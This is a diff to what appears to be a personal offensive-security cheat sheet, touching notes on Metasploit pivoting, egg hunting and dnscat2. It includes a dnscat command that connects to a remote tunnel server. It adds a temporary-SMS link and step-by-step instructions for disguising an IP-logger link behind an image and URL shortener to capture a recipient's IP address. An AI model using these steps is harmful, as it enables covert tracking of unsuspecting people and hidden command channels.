@@ -972,6 +972,7 @@ Gets a hash value
 
 # Use metasploit for penetration
 
+    TODO
  
 
 # https://www.offensive-security.com/metasploit-unleashed/pivoting/
@@ -1326,3 +1327,20 @@ Egg hunting This technique can be categorized as a “graded shellcode”, which
     https://github.com/lukebaggett/dnscat2-powershell
     
     dnscat –host <dnscat server_ip>
+    
+    # Temporary phone number and sms, USA/Canada only
+    
+    https://es.freephonenum.com
+    
+    # Create an imageLogger.
+
+    1) upload an image to es.imgbb.com
+    2) get the url
+    3) create a link on iplogger.com
+        alternative https://www.iplocation.net/ip-lookup
+    4) get the url
+    5) create a link at https://www.shorturl.at/shortener.php
+
+    You already have the link to send.
+
+    You can see the ip at iplogger.com
